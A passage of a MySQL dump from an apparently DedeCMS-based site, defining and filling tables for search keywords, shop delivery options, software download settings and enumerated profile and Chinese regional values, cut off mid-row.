/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_search_keywords` (
  `aid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `keyword` char(30) NOT NULL DEFAULT '',
  `spwords` char(50) NOT NULL DEFAULT '',
  `count` mediumint(8) unsigned NOT NULL DEFAULT '1',
  `result` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `lasttime` int(10) unsigned NOT NULL DEFAULT '0',
  `channelid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`aid`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_search_keywords`
--

LOCK TABLES `dede_search_keywords` WRITE;
/*!40000 ALTER TABLE `dede_search_keywords` DISABLE KEYS */;
INSERT INTO `dede_search_keywords` VALUES (1,'xxx','xxx',20,0,1563894809,0,0),(2,'as','as',63,0,1570424715,0,0),(3,'1111','1111',2,0,1561875718,0,0);
/*!40000 ALTER TABLE `dede_search_keywords` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_sgpage`
--

DROP TABLE IF EXISTS `dede_sgpage`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_sgpage` (
  `aid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(60) NOT NULL DEFAULT '',
  `ismake` smallint(6) NOT NULL DEFAULT '1',
  `filename` varchar(60) NOT NULL DEFAULT '',
  `keywords` varchar(30) NOT NULL DEFAULT '',
  `template` varchar(30) NOT NULL DEFAULT '',
  `likeid` varchar(20) NOT NULL DEFAULT '',
  `description` varchar(250) NOT NULL DEFAULT '',
  `uptime` int(10) unsigned NOT NULL DEFAULT '0',
  `body` mediumtext,
  PRIMARY KEY (`aid`),
  KEY `ismake` (`ismake`,`uptime`),
  KEY `likeid` (`likeid`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_sgpage`
--

LOCK TABLES `dede_sgpage` WRITE;
/*!40000 ALTER TABLE `dede_sgpage` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_sgpage` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_shops_delivery`
--

DROP TABLE IF EXISTS `dede_shops_delivery`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_shops_delivery` (
  `pid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `dname` char(80) NOT NULL,
  `price` float(13,2) NOT NULL DEFAULT '0.00',
  `des` char(255) DEFAULT NULL,
  `orders` int(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`pid`),
  KEY `orders` (`orders`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_shops_delivery`
--

LOCK TABLES `dede_shops_delivery` WRITE;
/*!40000 ALTER TABLE `dede_shops_delivery` DISABLE KEYS */;
INSERT INTO `dede_shops_delivery` VALUES (1,'送货上门',10.21,'送货上门,领取商品时付费.',0),(2,'特快专递（EMS）',25.00,'特快专递（EMS）,要另收手续费.',0),(3,'普通邮递',5.00,'普通邮递',0),(4,'邮局快邮',12.00,'邮局快邮',0);
/*!40000 ALTER TABLE `dede_shops_delivery` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_shops_orders`
--

DROP TABLE IF EXISTS `dede_shops_orders`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_shops_orders` (
  `oid` varchar(80) NOT NULL,
  `userid` int(10) NOT NULL,
  `pid` int(10) NOT NULL DEFAULT '0',
  `paytype` tinyint(2) NOT NULL DEFAULT '1',
  `cartcount` int(10) NOT NULL DEFAULT '0',
  `dprice` float(13,2) NOT NULL DEFAULT '0.00',
  `price` float(13,2) NOT NULL DEFAULT '0.00',
  `priceCount` float(13,2) NOT NULL,
  `state` tinyint(1) NOT NULL DEFAULT '0',
  `ip` char(15) NOT NULL DEFAULT '',
  `stime` int(10) NOT NULL DEFAULT '0',
  KEY `stime` (`stime`),
  KEY `userid` (`userid`),
  KEY `oid` (`oid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_shops_orders`
--

LOCK TABLES `dede_shops_orders` WRITE;
/*!40000 ALTER TABLE `dede_shops_orders` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_shops_orders` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_shops_products`
--

DROP TABLE IF EXISTS `dede_shops_products`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_shops_products` (
  `aid` mediumint(8) NOT NULL DEFAULT '0',
  `oid` varchar(80) NOT NULL DEFAULT '',
  `userid` int(10) NOT NULL,
  `title` varchar(80) NOT NULL DEFAULT '',
  `price` float(13,2) NOT NULL DEFAULT '0.00',
  `buynum` int(10) NOT NULL DEFAULT '9',
  KEY `oid` (`oid`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_shops_products`
--

LOCK TABLES `dede_shops_products` WRITE;
/*!40000 ALTER TABLE `dede_shops_products` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_shops_products` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_shops_userinfo`
--

DROP TABLE IF EXISTS `dede_shops_userinfo`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_shops_userinfo` (
  `userid` int(10) NOT NULL,
  `oid` varchar(80) NOT NULL DEFAULT '',
  `consignee` char(15) NOT NULL DEFAULT '',
  `address` varchar(255) NOT NULL DEFAULT '',
  `zip` int(10) NOT NULL DEFAULT '0',
  `tel` varchar(255) NOT NULL DEFAULT '',
  `email` varchar(255) NOT NULL DEFAULT '',
  `des` varchar(255) NOT NULL DEFAULT '',
  KEY `oid` (`oid`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_shops_userinfo`
--

LOCK TABLES `dede_shops_userinfo` WRITE;
/*!40000 ALTER TABLE `dede_shops_userinfo` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_shops_userinfo` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_softconfig`
--

DROP TABLE IF EXISTS `dede_softconfig`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_softconfig` (
  `downtype` smallint(6) NOT NULL DEFAULT '0',
  `ismoresite` smallint(6) NOT NULL DEFAULT '0',
  `gotojump` smallint(6) NOT NULL DEFAULT '0',
  `islocal` smallint(5) unsigned NOT NULL DEFAULT '1',
  `sites` text,
  `downmsg` text,
  `moresitedo` smallint(5) unsigned NOT NULL DEFAULT '1',
  `dfrank` smallint(5) unsigned NOT NULL DEFAULT '0',
  `dfywboy` smallint(5) unsigned NOT NULL DEFAULT '0',
  `argrange` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`downtype`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_softconfig`
--

LOCK TABLES `dede_softconfig` WRITE;
/*!40000 ALTER TABLE `dede_softconfig` DISABLE KEYS */;
INSERT INTO `dede_softconfig` VALUES (0,1,1,1,'http://www.aaa.com | 镜像地址一	\nhttp://www.bbb.com | 镜像地址二	\nhttp://www.ccc.com | 镜像地址三	\n','<p>?推荐使用第三方专业下载工具下载本站软件，使用 WinRAR v3.10 以上版本解压本站软件。<br />	\n?如果这个软件总是不能下载的请点击报告错误,谢谢合作!!<br />	\n?下载本站资源，如果服务器暂不能下载请过一段时间重试！<br />	\n?如果遇到什么问题，请到本站论坛去咨寻，我们将在那里提供更多 、更好的资源！<br />	\n?本站提供的一些商业软件是供学习研究之用，如用于商业用途，请购买正版。</p>',0,0,0,0);
/*!40000 ALTER TABLE `dede_softconfig` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_sphinx`
--

DROP TABLE IF EXISTS `dede_sphinx`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_sphinx` (
  `countid` int(11) unsigned NOT NULL,
  `maxaid` int(11) unsigned NOT NULL,
  PRIMARY KEY (`countid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_sphinx`
--

LOCK TABLES `dede_sphinx` WRITE;
/*!40000 ALTER TABLE `dede_sphinx` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_sphinx` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_stepselect`
--

DROP TABLE IF EXISTS `dede_stepselect`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_stepselect` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `itemname` char(30) DEFAULT NULL,
  `egroup` char(20) DEFAULT NULL,
  `issign` tinyint(1) unsigned DEFAULT '0',
  `issystem` tinyint(1) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=16 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_stepselect`
--

LOCK TABLES `dede_stepselect` WRITE;
/*!40000 ALTER TABLE `dede_stepselect` DISABLE KEYS */;
INSERT INTO `dede_stepselect` VALUES (1,'血型','blood',1,1),(2,'体型','bodytype',1,1),(3,'公司规模','cosize',1,1),(4,'交友','datingtype',1,1),(5,'是否饮酒','drink',1,1),(6,'教育程度','education',1,1),(7,'住房','house',1,1),(8,'收入','income',1,1),(9,'婚姻','marital',1,1),(10,'是否抽烟','smoke',1,1),(11,'星座','star',1,1),(12,'系统缓存标识','system',1,1),(13,'行业','vocation',2,0),(14,'地区','nativeplace',2,0),(15,'信息类型','infotype',2,0);
/*!40000 ALTER TABLE `dede_stepselect` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_sys_enum`
--

DROP TABLE IF EXISTS `dede_sys_enum`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_sys_enum` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `ename` char(30) NOT NULL DEFAULT '',
  `evalue` char(20) NOT NULL DEFAULT '0',
  `egroup` char(20) NOT NULL DEFAULT '',
  `disorder` smallint(5) unsigned NOT NULL DEFAULT '0',
  `issign` tinyint(1) unsigned NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=20020 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_sys_enum`
--

LOCK TABLES `dede_sys_enum` WRITE;
/*!40000 ALTER TABLE `dede_sys_enum` DISABLE KEYS */;
INSERT INTO `dede_sys_enum` VALUES (139,'cms制作','503','vocation',503,0),(39,'租房','1','house',0,1),(40,'一房以上','2','house',0,1),(41,'两房以上','3','house',0,1),(42,'大户/别墅','4','house',0,1),(43,'低于1000元','1','income',0,1),(44,'1000元以上','2','income',0,1),(45,'2000元以上','3','income',0,1),(46,'4000元以上','4','income',0,1),(47,'8000元以上','5','income',0,1),(48,'15000以上','6','income',0,1),(49,'初中以上','1','education',0,1),(50,'高中/中专','2','education',0,1),(51,'大学专科','3','education',0,1),(52,'大学本科','4','education',0,1),(53,'硕士','5','education',0,1),(54,'博士以上','6','education',0,1),(55,'仅用于判断缓存是否存在','0','system',0,1),(56,'白羊座','1','star',0,1),(57,'金牛座','2','star',0,1),(58,'双子座','3','star',0,1),(59,'巨蟹座','4','star',0,1),(60,'狮子座','5','star',0,1),(61,'处女座','6','star',0,1),(62,'天枰座','7','star',0,1),(63,'天蝎座','8','star',0,1),(64,'射手座','9','star',0,1),(65,'摩羯座','10','star',0,1),(66,'水瓶座','11','star',0,1),(67,'双鱼座','12','star',0,1),(68,'不吸烟','1','smoke',0,1),(69,'偶尔吸一点','2','smoke',0,1),(70,'抽得很凶','3','smoke',0,1),(71,'不喝酒','1','drink',0,1),(72,'偶尔喝一点','2','drink',0,1),(73,'喝得很凶','3','drink',0,1),(74,'A','1','blood',0,1),(75,'B','2','blood',0,1),(76,'AB','3','blood',0,1),(77,'O','4','blood',0,1),(78,'未婚','1','marital',0,1),(79,'已婚','2','marital',0,1),(80,'离异','3','marital',0,1),(81,'丧偶','4','marital',0,1),(82,'匀称','1','bodytype',0,1),(83,'苗条','2','bodytype',0,1),(84,'健壮','3','bodytype',0,1),(85,'略胖','4','bodytype',0,1),(86,'丰满','5','bodytype',0,1),(87,'瘦小','6','bodytype',0,1),(88,'高瘦','7','bodytype',0,1),(89,'网友','1','datingtype',0,1),(90,'恋人','2','datingtype',0,1),(91,'玩伴','3','datingtype',0,1),(92,'共同兴趣','4','datingtype',0,1),(93,'男性朋友','5','datingtype',0,1),(94,'女性朋友','6','datingtype',0,1),(95,'50人以下','1','cosize',0,1),(96,'50-200人','2','cosize',0,1),(97,'200-500人','3','cosize',0,1),(98,'500-2000人','4','cosize',0,1),(99,'2000-5000人','5','cosize',0,1),(100,'5000人以上','6','cosize',0,1),(20019,'澳门特别行政区','17500','nativeplace',17500,0),(20018,'香港特别行政区','17000','nativeplace',17000,0),(20017,'台湾省','16500','nativeplace',16500,0),(20016,'图木舒克市','16015.3','nativeplace',16015,2),(20015,'阿拉尔市','16015.2','nativeplace',16015,2),(20014,'石河子市','16015.1','nativeplace',16015,2),(20013,'省直辖行政单位','16015','nativeplace',16015,1),(20012,'吉木乃县','16014.7','nativeplace',16015,2),(20011,'青河县','16014.6','nativeplace',16015,2),(111,'商品','500','infotype',500,0),(112,'租房','1000','infotype',1000,0),(113,'交友','1500','infotype',1500,0),(114,'招聘','2000','infotype',2000,0),(115,'求职','2500','infotype',2500,0),(116,'票务','3000','infotype',3000,0),(117,'服务','3500','infotype',3500,0),(118,'培训','4000','infotype',4000,0),(119,'出售','501','infotype',501,1),(121,'求购','502','infotype',502,1),(122,'交换','503','infotype',503,1),(123,'合作','504','infotype',504,1),(124,'出租','1001','infotype',1001,1),(125,'求租','1002','infotype',1002,1),(126,'合租','1003','infotype',1003,1),(127,'找帅哥','1501','infotype',1501,1),(128,'找美女','1502','infotype',1502,1),(129,'纯友谊','1503','infotype',1503,1),(130,'玩伴','1504','infotype',1504,1),(131,'互联网','500','vocation',500,0),(132,'网站制作','501','vocation',501,0),(133,'机械','1000','vocation',1000,0),(134,'农业机械','1001','vocation',1001,1),(135,'机床','1002','vocation',1002,1),(136,'纺织设备和器材','1003','vocation',1003,1),(137,'风机/排风设备','1004','vocation',1004,1),(138,'虚心','502','vocation',502,0),(140,'模板制作','503.001','vocation',503,2),(141,'模块开发','503.002','vocation',503,2),(142,'企业网站','501.001','vocation',501,2),(143,'门户开发','501.002','vocation',501,2),(144,'商业网站','501.003','vocation',501,2),(145,'个人博客','501.004','vocation',501,2),(166,'化工','1500','vocation',1500,0),(147,'松松散散','502.001','vocation',502,2),(148,'测试分类','502.002','vocation',502,2),(150,'塑料切割机','1002.001','vocation',1002,2),(151,'打磨机','1002.002','vocation',1002,2),(152,'水货机器','1002.003','vocation',1002,2),(153,'自动收割机','1001.001','vocation',1001,2),(154,'运输机','1001.002','vocation',1001,2),(159,'水货','2501','infotype',2501,0),(160,'水111','2501.001','infotype',2501,2),(161,'水222','2501.002','infotype',2501,2),(162,'有才','2502','infotype',2502,0),(163,'有才啊啊啊','2502.001','infotype',2502,2),(167,'塑料化工','1501','vocation',1501,0),(168,'加工','1501.001','vocation',1501,2),(169,'生产','1501.002','vocation',1501,2),(170,'物流','1501.003','vocation',1501,2),(171,'挨踢工作者','2000','vocation',2000,0),(172,'程序员','2001','vocation',2001,0),(173,'美工设计','2002','vocation',2002,0),(174,'前端开发','2003','vocation',2003,0),(175,'配色','2002.001','vocation',2002,2),(176,'美学设计','2002.002','vocation',2002,2),(178,'ddddd','502.003','vocation',502,2),(179,'学习下','502.004','vocation',502,2),(20010,'哈巴河县','16014.5','nativeplace',16015,2),(20009,'福海县','16014.4','nativeplace',16014,2),(20008,'富蕴县','16014.3','nativeplace',16014,2),(20007,'布尔津县','16014.2','nativeplace',16014,2),(20006,'阿勒泰市','16014.1','nativeplace',16014,2),(20005,'阿勒泰地区','16014','nativeplace',16014,1),(20004,'和布克赛尔蒙古自治县','16013.7','nativeplace',16014,2),(20003,'裕民县','16013.6','nativeplace',16014,2),(20002,'托里县','16013.5','nativeplace',16014,2),(20001,'沙湾县','16013.4','nativeplace',16013,2),(20000,'额敏县','16013.3','nativeplace',16013,2),(19999,'乌苏市','16013.2','nativeplace',16013,2),(19998,'塔城市','16013.1','nativeplace',16013,2),(19997,'塔城地区','16013','nativeplace',16013,1),(19996,'尼勒克县','16012.10','nativeplace',16012,2),(19995,'特克斯县','16012.9','nativeplace',16013,2),(19994,'昭苏县','16012.8','nativeplace',16013,2),(19993,'新源县','16012.7','nativeplace',16013,2),(19992,'巩留县','16012.6','nativeplace',16013,2),(19991,'霍城县','16012.5','nativeplace',16013,2),(19990,'察布查尔锡伯自治县','16012.4','nativeplace',16012,2),(19989,'伊宁县','16012.3','nativeplace',16012,2),(19988,'奎屯市','16012.2','nativeplace',16012,2),(19987,'伊宁市','16012.1','nativeplace',16012,2),(19986,'伊犁哈萨克自治州','16012','nativeplace',16012,1),(19985,'民丰县','16011.8','nativeplace',16012,2),(19984,'于田县','16011.7','nativeplace',16012,2),(19983,'策勒县','16011.6','nativeplace',16012,2),(19982,'洛浦县','16011.5','nativeplace',16012,2),(19981,'皮山县','16011.4','nativeplace',16011,2),(19980,'墨玉县','16011.3','nativeplace',16011,2),(19979,'和田县','16011.2','nativeplace',16011,2),(19978,'和田市','16011.1','nativeplace',16011,2),(19977,'和田地区','16011','nativeplace',16011,1),(19976,'塔什库尔干塔吉克自治县','16010.12','nativeplace',16010,2),(19975,'巴楚县','16010.11','nativeplace',16010,2),(19974,'伽师县','16010.10','nativeplace',16010,2),(19973,'岳普湖县','16010.9','nativeplace',16011,2),(19972,'麦盖提县','16010.8','nativeplace',16011,2),(19971,'叶城县','16010.7','nativeplace',16011,2),(19970,'莎车县','16010.6','nativeplace',16011,2),(19969,'泽普县','16010.5','nativeplace',16011,2),(19968,'英吉沙县','16010.4','nativeplace',16010,2),(19967,'疏勒县','16010.3','nativeplace',16010,2),(19966,'疏附县','16010.2','nativeplace',16010,2),(19965,'喀什市','16010.1','nativeplace',16010,2),(19964,'喀什地区','16010','nativeplace',16010,1),(19963,'乌恰县','16009.4','nativeplace',16009,2),(19962,'阿合奇县','16009.3','nativeplace',16009,2),(19961,'阿克陶县','16009.2','nativeplace',16009,2),(19960,'阿图什市','16009.1','nativeplace',16009,2),(19959,'克孜勒苏柯尔克孜自治州','16009','nativeplace',16009,1),(19958,'柯坪县','16008.9','nativeplace',16009,2),(19957,'阿瓦提县','16008.8','nativeplace',16009,2),(19956,'乌什县','16008.7','nativeplace',16009,2),(19955,'拜城县','16008.6','nativeplace',16009,2),(19954,'新和县','16008.5','nativeplace',16009,2),(19953,'沙雅县','16008.4','nativeplace',16008,2),(19952,'库车县','16008.3','nativeplace',16008,2),(19951,'温宿县','16008.2','nativeplace',16008,2),(19950,'阿克苏市','16008.1','nativeplace',16008,2),(19949,'阿克苏地区','16008','nativeplace',16008,1),(19948,'博湖县','16007.9','nativeplace',16008,2),(19947,'和硕县','16007.8','nativeplace',16008,2),(19946,'和静县','16007.7','nativeplace',16008,2),(19945,'焉耆回族自治县','16007.6','nativeplace',16008,2),(19944,'且末县','16007.5','nativeplace',16008,2),(19943,'若羌县','16007.4','nativeplace',16007,2),(19942,'尉犁县','16007.3','nativeplace',16007,2),(19941,'轮台县','16007.2','nativeplace',16007,2),(19940,'库尔勒市','16007.1','nativeplace',16007,2),(19939,'巴音郭楞蒙古自治州','16007','nativeplace',16007,1),(19938,'温泉县','16006.3','nativeplace',16006,2),(19937,'精河县','16006.2','nativeplace',16006,2),(19936,'博乐市','16006.1','nativeplace',16006,2),(19935,'博尔塔拉蒙古自治州','16006','nativeplace',16006,1),(19934,'木垒哈萨克自治县','16005.8','nativeplace',16006,2),(19933,'吉木萨尔县','16005.7','nativeplace',16006,2),(19932,'奇台县','16005.6','nativeplace',16006,2),(19931,'玛纳斯县','16005.5','nativeplace',16006,2),(19930,'呼图壁县','16005.4','nativeplace',16005,2),(19929,'米泉市','16005.3','nativeplace',16005,2),(19928,'阜康市','16005.2','nativeplace',16005,2),(19927,'昌吉市','16005.1','nativeplace',16005,2),(19926,'昌吉回族自治州','16005','nativeplace',16005,1),(19925,'伊吾县','16004.3','nativeplace',16004,2),(19924,'巴里坤哈萨克自治县','16004.2','nativeplace',16004,2),(19923,'哈密市','16004.1','nativeplace',16004,2),(19922,'哈密地区','16004','nativeplace',16004,1),(19921,'托克逊县','16003.3','nativeplace',16003,2),(19920,'鄯善县','16003.2','nativeplace',16003,2),(19919,'吐鲁番市','16003.1','nativeplace',16003,2),(19918,'吐鲁番地区','16003','nativeplace',16003,1),(19917,'乌尔禾区','16002.4','nativeplace',16002,2),(19916,'白碱滩区','16002.3','nativeplace',16002,2),(19915,'克拉玛依区','16002.2','nativeplace',16002,2),(19914,'独山子区','16002.1','nativeplace',16002,2),(19913,'克拉玛依市','16002','nativeplace',16002,1),(19912,'乌鲁木齐县','16001.8','nativeplace',16002,2),(19911,'东山区','16001.7','nativeplace',16002,2),(19910,'达坂城区','16001.6','nativeplace',16002,2),(19909,'头屯河区','16001.5','nativeplace',16002,2),(19908,'水磨沟区','16001.4','nativeplace',16001,2),(19907,'新市区','16001.3','nativeplace',16001,2),(19906,'沙依巴克区','16001.2','nativeplace',16001,2),(19905,'天山区','16001.1','nativeplace',16001,2),(19904,'乌鲁木齐市','16001','nativeplace',16001,1),(19903,'新疆维吾尔自治区','16000','nativeplace',16000,0),(19902,'海原县','15505.3','nativeplace',15505,2),(19901,'中宁县','15505.2','nativeplace',15505,2),(19900,'沙坡头区','15505.1','nativeplace',15505,2),(19899,'中卫市','15505','nativeplace',15505,1),(19898,'彭阳县','15504.5','nativeplace',15505,2),(19897,'泾源县','15504.4','nativeplace',15504,2),(19896,'隆德县','15504.3','nativeplace',15504,2),(19895,'西吉县','15504.2','nativeplace',15504,2),(19894,'原州区','15504.1','nativeplace',15504,2),(19893,'固原市','15504','nativeplace',15504,1),(19892,'青铜峡市','15503.4','nativeplace',15503,2),(19891,'同心县','15503.3','nativeplace',15503,2),(19890,'盐池县','15503.2','nativeplace',15503,2),(19889,'利通区','15503.1','nativeplace',15503,2),(19888,'吴忠市','15503','nativeplace',15503,1),(19887,'平罗县','15502.3','nativeplace',15502,2),(19886,'惠农区','15502.2','nativeplace',15502,2),(19885,'大武口区','15502.1','nativeplace',15502,2),(19884,'石嘴山市','15502','nativeplace',15502,1),(19883,'灵武市','15501.6','nativeplace',15502,2),(19882,'贺兰县','15501.5','nativeplace',15502,2),(19881,'永宁县','15501.4','nativeplace',15501,2),(19880,'金凤区','15501.3','nativeplace',15501,2),(19879,'西夏区','15501.2','nativeplace',15501,2),(19878,'兴庆区','15501.1','nativeplace',15501,2),(19877,'银川市','15501','nativeplace',15501,1),(19876,'宁夏回族自治区','15500','nativeplace',15500,0),(19875,'天峻县','15008.5','nativeplace',15009,2),(19874,'都兰县','15008.4','nativeplace',15008,2),(19873,'乌兰县','15008.3','nativeplace',15008,2),(19872,'德令哈市','15008.2','nativeplace',15008,2),(19871,'格尔木市','15008.1','nativeplace',15008,2),(19870,'海西蒙古族藏族自治州','15008','nativeplace',15008,1),(19869,'曲麻莱县','15007.6','nativeplace',15008,2),(19868,'囊谦县','15007.5','nativeplace',15008,2),(19867,'治多县','15007.4','nativeplace',15007,2),(19866,'称多县','15007.3','nativeplace',15007,2),(19865,'杂多县','15007.2','nativeplace',15007,2),(19864,'玉树县','15007.1','nativeplace',15007,2),(19863,'玉树藏族自治州','15007','nativeplace',15007,1),(19862,'玛多县','15006.6','nativeplace',15007,2),(19861,'久治县','15006.5','nativeplace',15007,2),(19860,'达日县','15006.4','nativeplace',15006,2),(19859,'甘德县','15006.3','nativeplace',15006,2),(19858,'班玛县','15006.2','nativeplace',15006,2),(19857,'玛沁县','15006.1','nativeplace',15006,2),(19856,'果洛藏族自治州','15006','nativeplace',15006,1),(19855,'贵南县','15005.5','nativeplace',15006,2),(19854,'兴海县','15005.4','nativeplace',15005,2),(19853,'贵德县','15005.3','nativeplace',15005,2),(19852,'同德县','15005.2','nativeplace',15005,2),(19851,'共和县','15005.1','nativeplace',15005,2),(19850,'海南藏族自治州','15005','nativeplace',15005,1),(19849,'河南蒙古族自治县','15004.4','nativeplace',15004,2),(19848,'泽库县','15004.3','nativeplace',15004,2),(19847,'尖扎县','15004.2','nativeplace',15004,2),(19846,'同仁县','15004.1','nativeplace',15004,2),(19845,'黄南藏族自治州','15004','nativeplace',15004,1),(19844,'刚察县','15003.4','nativeplace',15003,2),(19843,'海晏县','15003.3','nativeplace',15003,2),(19842,'祁连县','15003.2','nativeplace',15003,2),(19841,'门源回族自治县','15003.1','nativeplace',15003,2),(19840,'海北藏族自治州','15003','nativeplace',15003,1),(19839,'循化撒拉族自治县','15002.6','nativeplace',15003,2),(19838,'化隆回族自治县','15002.5','nativeplace',15003,2),(19837,'互助土族自治县','15002.4','nativeplace',15002,2),(19836,'乐都县','15002.3','nativeplace',15002,2),(19835,'民和回族土族自治县','15002.2','nativeplace',15002,2),(19834,'平安县','15002.1','nativeplace',15002,2),(19833,'海东地区','15002','nativeplace',15002,1),(19832,'湟源县','15001.7','nativeplace',15002,2),(19831,'湟中县','15001.6','nativeplace',15002,2),(19830,'大通回族土族自治县','15001.5','nativeplace',15002,2),(19829,'城北区','15001.4','nativeplace',15001,2),(19828,'城西区','15001.3','nativeplace',15001,2),(19827,'城中区','15001.2','nativeplace',15001,2),(19826,'城东区','15001.1','nativeplace',15001,2),(19825,'西宁市','15001','nativeplace',15001,1),(19824,'青海省','15000','nativeplace',15000,0),(19823,'夏河县','14514.8','nativeplace',14515,2),(19822,'碌曲县','14514.7','nativeplace',14515,2),(19821,'玛曲县','14514.6','nativeplace',14515,2),(19820,'迭部县','14514.5','nativeplace',14515,2),(19819,'舟曲县','14514.4','nativeplace',14514,2),(19818,'卓尼县','14514.3','nativeplace',14514,2),(19817,'临潭县','14514.2','nativeplace',14514,2),(19816,'合作市','14514.1','nativeplace',14514,2),(19815,'甘南藏族自治州','14514','nativeplace',14514,1),(19814,'积石山保安族东乡族撒拉族自治县','14513.8','nativeplace',14514,2),(19813,'东乡族自治县','14513.7','nativeplace',14514,2),(19812,'和政县','14513.6','nativeplace',14514,2),(19811,'广河县','14513.5','nativeplace',14514,2),(19810,'永靖县','14513.4','nativeplace',14513,2),(19809,'康乐县','14513.3','nativeplace',14513,2),(19808,'临夏县','14513.2','nativeplace',14513,2),(19807,'临夏市','14513.1','nativeplace',14513,2),(19806,'临夏回族自治州','14513','nativeplace',14513,1),(19805,'两当县','14512.9','nativeplace',14513,2),(19804,'徽　县','14512.8','nativeplace',14513,2),(19803,'礼　县','14512.7','nativeplace',14513,2),(19802,'西和县','14512.6','nativeplace',14513,2),(19801,'康　县','14512.5','nativeplace',14513,2),(19800,'宕昌县','14512.4','nativeplace',14512,2),(19799,'文　县','14512.3','nativeplace',14512,2),(19798,'成　县','14512.2','nativeplace',14512,2),(19797,'武都区','14512.1','nativeplace',14512,2),(19796,'陇南市','14512','nativeplace',14512,1),(19795,'岷　县','14511.7','nativeplace',14512,2),(19794,'漳　县','14511.6','nativeplace',14512,2),(19793,'临洮县','14511.5','nativeplace',14512,2),(19792,'渭源县','14511.4','nativeplace',14511,2),(19791,'陇西县','14511.3','nativeplace',14511,2),(19790,'通渭县','14511.2','nativeplace',14511,2),(19789,'安定区','14511.1','nativeplace',14511,2),(19788,'定西市','14511','nativeplace',14511,1),(19787,'镇原县','14510.8','nativeplace',14511,2),(19786,'宁　县','14510.7','nativeplace',14511,2),(19785,'正宁县','14510.6','nativeplace',14511,2),(19784,'合水县','14510.5','nativeplace',14511,2),(19783,'华池县','14510.4','nativeplace',14510,2),(19782,'环　